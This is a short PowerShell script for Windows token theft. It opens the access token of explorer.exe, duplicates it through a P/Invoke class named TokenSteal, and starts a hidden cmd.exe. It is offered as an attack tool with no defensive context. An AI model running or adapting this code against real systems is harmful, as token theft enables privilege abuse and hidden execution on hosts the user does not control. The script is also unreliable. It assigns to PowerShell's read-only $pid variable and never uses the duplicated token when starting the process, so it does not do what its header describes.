# Token duplication and process spawn
# Requires high privileges

param(
    [string]$Process = "cmd.exe"
)

Add-Type -AssemblyName System.Runtime.InteropServices

$processes = Get-Process | Where-Object { $_.Name -eq "explorer" }
$pid = $processes[0].Id

$procHandle = (Get-Process -Id $pid).Handle

$signature = @"
using System;
using System.Runtime.InteropServices;

public class TokenSteal {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
}
"@

Add-Type $signature

$token = [IntPtr]::Zero
$dupToken = [IntPtr]::Zero

[TokenSteal]::OpenProcessToken($procHandle, 0x0002 -bor 0x0008, [ref]$token) | Out-Null
[TokenSteal]::DuplicateToken($token, 2, [ref]$dupToken) | Out-Null

Start-Process $Process -UseNewEnvironment -WorkingDirectory "C:\" -WindowStyle Hidden

